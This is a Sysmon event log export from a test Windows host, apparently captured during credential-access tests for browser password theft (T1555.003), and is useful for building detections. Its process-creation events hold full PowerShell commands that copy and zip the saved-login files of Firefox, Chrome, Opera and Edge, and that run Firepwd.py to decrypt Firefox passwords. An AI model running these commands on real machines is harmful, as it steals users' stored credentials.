Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2023-12-04 04:35:22.896
SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
SourceProcessId: 3600
SourceThreadId: 8604
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {1ac2ee8c-570a-656d-e202-000000001000}
TargetProcessId: 672
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
SourceUser: DESKTOP-92IIJB9\Test
TargetUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2023-12-04 04:35:22.903
ProcessGuid: {1ac2ee8c-570a-656d-e202-000000001000}
ProcessId: 672
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$exfil_folder = \""""$env:temp\T1555.003\""""
if (test-path \""""$exfil_folder\"""") {} else {new-item -path \""""$env:temp\"""" -Name \""""T1555.003\"""" -ItemType \""""directory\"""" -force}
$FirefoxCredsLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
if (test-path \""""$FirefoxCredsLocation\key4.db\"""") {copy-item \""""$FirefoxCredsLocation\key4.db\"""" -destination \""""$exfil_folder\T1555.003Firefox_key4.db\""""} else {}
if (test-path \""""$FirefoxCredsLocation\logins.json\"""") {copy-item \""""$FirefoxCredsLocation\logins.json\"""" -destination \""""$exfil_folder\T1555.003Firefox_logins.json\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data\""""} else {}
if (test-path \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""") {copy-item \""""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account\"""" -destination \""""$exfil_folder\T1555.003Chrome_Login Data For Account\""""} else {}
if (test-path \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""") {copy-item \""""$env:appdata\Opera Software\Opera Stable\Login Data\"""" -destination \""""$exfil_folder\T1555.003Opera_Login Data\""""} else {}
if (test-path \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""") {copy-item \""""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\"""" -destination \""""$exfil_folder\T1555.003Edge_Login Data\""""} else {} 
compress-archive -path \""""$exfil_folder\"""" -destinationpath \""""$exfil_folder.zip\"""" -force}
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ParentProcessId: 3600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:35:22.896
ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ProcessId: 3600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:35:22.725
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
UtcTime: 2023-12-04 04:35:22.709
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
CreationUtcTime: 2023-12-04 04:32:15.278
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2023-12-04 04:35:22.693
SourceProcessGUID: {1ac2ee8c-5709-656d-df02-000000001000}
SourceProcessId: 7908
SourceThreadId: 8680
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {1ac2ee8c-570a-656d-e102-000000001000}
TargetProcessId: 5908
TargetImage: C:\Windows\system32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96BA802A4)
SourceUser: DESKTOP-92IIJB9\Test
TargetUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2023-12-04 04:35:22.690
ProcessGuid: {1ac2ee8c-570a-656d-e102-000000001000}
ProcessId: 5908
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\system32\cmd.exe"" /c C:temp\..\ExternalPayloads\Firepwd.py -d 
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ParentProcessId: 7908
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:temp\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:22 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:35:22.069
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: Client Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2023-12-04 04:35:21.693
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
PipeName: \PSHost.133461381215130789.7908.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
RuleName: -
UtcTime: 2023-12-04 04:35:21.615
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
User: DESKTOP-92IIJB9\Test
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ge0lr225.m5z.ps1
Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
IsExecutable: false"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:35:21.615
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ge0lr225.m5z.ps1
CreationUtcTime: 2023-12-04 04:35:21.615
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:35:21.569
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: IOfficeAntiVirus Module
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:21.537
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:21.537
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft Common Language Runtime Class Library
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscorlib.dll
Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:21.537
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:21.537
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscoreei.dll
Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:21.522
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\mscoree.dll
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mscoree.dll
Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2023-12-04 04:35:21.506
SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
SourceProcessId: 3600
SourceThreadId: 8604
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {1ac2ee8c-5709-656d-df02-000000001000}
TargetProcessId: 7908
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
SourceUser: DESKTOP-92IIJB9\Test
TargetUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:35:21.513
ProcessGuid: {1ac2ee8c-5709-656d-df02-000000001000}
ProcessId: 7908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$PasswordDBLocation = get-childitem -path \""""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\\""""
cmd /c C:temp\..\ExternalPayloads\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
cat $env:temp\T1555.003Test8.txt}
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ParentProcessId: 3600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:35:21.506
ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ProcessId: 3600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:35:21.147
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:21 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
UtcTime: 2023-12-04 04:35:21.147
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
CreationUtcTime: 2023-12-04 04:32:15.278
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:35:18.647
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: Client Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2023-12-04 04:35:18.271
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
PipeName: \PSHost.133461381180739306.8772.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
RuleName: -
UtcTime: 2023-12-04 04:35:18.193
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
User: DESKTOP-92IIJB9\Test
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ooeetq5p.kon.ps1
Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
IsExecutable: false"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:35:18.162
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_ooeetq5p.kon.ps1
CreationUtcTime: 2023-12-04 04:35:18.162
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:35:18.147
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: IOfficeAntiVirus Module
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:18.100
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:18.100
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft Common Language Runtime Class Library
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscorlib.dll
Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:35:18.100
ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
ProcessId: 8772
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
